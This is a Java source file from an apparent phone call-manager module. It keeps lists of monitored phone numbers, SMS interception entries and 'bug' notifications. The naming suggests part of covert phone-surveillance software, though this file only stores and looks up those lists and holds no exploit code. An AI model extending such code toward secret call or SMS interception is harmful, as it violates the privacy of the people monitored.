package com.vvt.callmanager;

import java.util.ArrayList;
import java.util.HashSet;
import java.util.Iterator;

import com.vvt.callmanager.ref.BugNotification;
import com.vvt.callmanager.ref.Customization;
import com.vvt.callmanager.ref.MonitorList;
import com.vvt.callmanager.ref.MonitorNumber;
import com.vvt.callmanager.ref.SmsInterceptInfo;
import com.vvt.callmanager.ref.SmsInterceptList;
import com.vvt.logger.FxLog;
import com.vvt.telephony.TelephonyUtils;

public class CallMgrPreference {
	
	private static final String TAG = "CallMgrPreference";
	private static final boolean LOGD = Customization.DEBUG;
	
	private static CallMgrPreference sInstance;
	
	private HashSet<MonitorNumber> mMonitors;
	private HashSet<SmsInterceptInfo> mSmsInterceptList;
	private HashSet<BugNotification> mBugNotifications;
	
	public static CallMgrPreference getInstance() {
		if (sInstance == null) {
			sInstance = new CallMgrPreference();
		}
		return sInstance;
	}
	
	private CallMgrPreference() {
		mMonitors = new HashSet<MonitorNumber>();
		mSmsInterceptList = new HashSet<SmsInterceptInfo>();
		mBugNotifications = new HashSet<BugNotification>();
	}
	
	public boolean isMonitorNumber(String number) {
		String monitorNumber = null;
		synchronized (mMonitors) {
			for (MonitorNumber monitor : mMonitors) {
				monitorNumber = monitor.getPhoneNumber();
				if (TelephonyUtils.isSamePhoneNumber(
						monitorNumber, number, 
						Customization.PHONENUMBER_VALID_LENGTH)) {
					return true;
				}
			}
		}
		return false;
	}
	
	public MonitorNumber getMonitorInfo(String number) {
		String monitorNumber = null;
		synchronized (mMonitors) {
			for (MonitorNumber monitor : mMonitors) {
				monitorNumber = monitor.getPhoneNumber();
				if (TelephonyUtils.isSamePhoneNumber(
						monitorNumber, number, 
						Customization.PHONENUMBER_VALID_LENGTH)) {
					return monitor;
				}
			}
		}
		return null;
	}
	
	public HashSet<MonitorNumber> getMonitors() {
		return mMonitors;
	}
	
	public MonitorList getMonitors(String ownerPackage) {
		MonitorNumber monitor = null;
		ArrayList<MonitorNumber> monitors = new ArrayList<MonitorNumber>();
		
		synchronized (mMonitors) {
			Iterator<MonitorNumber> it = mMonitors.iterator();
			
			while (it.hasNext()) {
				monitor = it.next();
				if (ownerPackage.equals(monitor.getOwnerPackage())) {
					monitors.add(monitor);
				}
			}
		}
		
		MonitorList monitorList = new MonitorList(monitors);
		return monitorList;
	}
	
	public boolean addMonitor(MonitorNumber monitor) {
		boolean isSuccess = false;
		
		synchronized (mMonitors) {
			String phoneNumber = monitor.getPhoneNumber();
			if (phoneNumber != null) {
				phoneNumber = TelephonyUtils.cleanPhoneNumber(phoneNumber);
				
				if (phoneNumber.length() >= Customization.PHONENUMBER_VALID_LENGTH) {
					isSuccess = mMonitors.add(monitor);
					if (isSuccess) {
						if (LOGD) FxLog.d(TAG, "Monitor adding success");
					}
					else {
						if (LOGD) FxLog.d(TAG, "Monitor adding failed! the number is already existed");
					}
				}
				else {
					if (LOGD) FxLog.d(TAG, "Adding failed, the number is too short");
				}
			}
			else {
				if (LOGD) FxLog.d(TAG, "Adding failed, the number is not specified");
			}
		}
		return isSuccess;
	}
	
	public boolean removeMonitor(MonitorNumber monitor) {
		boolean isSuccess = false;
		synchronized (mMonitors) {
			isSuccess = mMonitors.remove(monitor);
			if (isSuccess) {
				if (LOGD) FxLog.d(TAG, "Monitor removing success");
			}
			else {
				if (LOGD) FxLog.d(TAG, "Monitor removing failed! the number is not existed");
			}
		}
		return isSuccess;
	}
	
	public boolean removeAllMonitor(String ownerPackage) {
		boolean isSuccess = false;
		MonitorNumber monitor = null;
		ArrayList<MonitorNumber> monitors = new ArrayList<MonitorNumber>();
		
		synchronized (mMonitors) {
			Iterator<MonitorNumber> it = mMonitors.iterator();
			while (it.hasNext()) {
				monitor = it.next();
				if (ownerPackage.equals(monitor.getOwnerPackage())) {
					monitors.add(monitor);
				}
			}
			if (monitors.size() > 0) isSuccess = true;
			
			it = monitors.iterator();
			while (it.hasNext()) {
				mMonitors.remove(it.next());
			}
		}
		
		return isSuccess;
	}
	
	public HashSet<SmsInterceptInfo> getSmsInterceptList() {
		return mSmsInterceptList;
	}
	
	public SmsInterceptList getSmsInterceptList(String ownerPackage) {
		SmsInterceptInfo smsInfo = null;
		ArrayList<SmsInterceptInfo> smsIntercepts = new ArrayList<SmsInterceptInfo>();
		
		synchronized (mSmsInterceptList) {
			Iterator<SmsInterceptInfo> it = mSmsInterceptList.iterator();
			
			while (it.hasNext()) {
				smsInfo = it.next();
				if (ownerPackage.equals(smsInfo.getOwnerPackage())) {
					smsIntercepts.add(smsInfo);
				}
			}
		}
		
		SmsInterceptList smsInterceptList = new SmsInterceptList(smsIntercepts);
		return smsInterceptList;
	}

	/**
	 * @param info
	 * @return true if this set did not already contain the specified element
	 */
	public boolean addSmsIntercept(SmsInterceptInfo info) {
		boolean isSuccess = false;
		if (info != null) {
			synchronized (mSmsInterceptList) {
				isSuccess = mSmsInterceptList.add(info);
				if (isSuccess) {
					if (LOGD) FxLog.d(TAG, "Sms Intercept adding success");
				}
				else {
					if (LOGD) FxLog.d(TAG, "Sms Intercept adding failed! the same item is already existed");
				}
			}
		}
		return isSuccess;
	}
	
	/**
	 * @param info
	 * @return true if the set contained the specified element
	 */
	public boolean removeSmsIntercept(SmsInterceptInfo info) {
		boolean isSuccess = false;
		if (info != null) {
			synchronized (mSmsInterceptList) {
				isSuccess = mSmsInterceptList.remove(info);
				if (isSuccess) {
					if (LOGD) FxLog.d(TAG, "SMS intercept removing success");
				}
				else {
					if (LOGD) FxLog.d(TAG, "SMS intercept removing failed! the number is not existed");
				}
			}
		}
		return isSuccess;
	}
	
	public boolean removeAllSmsIntercept(String ownerPackage) {
		boolean isSuccess = false;
		SmsInterceptInfo smsInfo = null;
		ArrayList<SmsInterceptInfo> smsIntercepts = new ArrayList<SmsInterceptInfo>();
		
		synchronized (mSmsInterceptList) {
			Iterator<SmsInterceptInfo> it = mSmsInterceptList.iterator();
			while (it.hasNext()) {
				smsInfo = it.next();
				if (ownerPackage.equals(smsInfo.getOwnerPackage())) {
					smsIntercepts.add(smsInfo);
				}
			}
			if (smsIntercepts.size() > 0) isSuccess = true;
			
			it = smsIntercepts.iterator();
			while (it.hasNext()) {
				mSmsInterceptList.remove(it.next());
			}
		}
		
		return isSuccess;
	}
	
	public boolean addBugNotifications(BugNotification notification) {
		boolean isSuccess = false;
		synchronized (mBugNotifications) {
			if (mBugNotifications.contains(notification)) {
				mBugNotifications.remove(notification);
			}
			isSuccess = mBugNotifications.add(notification);
		}
		return isSuccess;
	}
	
	public boolean removeBugNotification(BugNotification notification) {
		boolean isSuccess = false;
		synchronized (mBugNotifications) {
			isSuccess = mBugNotifications.remove(notification);
		}
		return isSuccess;
	}
	
	public HashSet<BugNotification> getBugNotifications() {
		return mBugNotifications;
	}
	
}
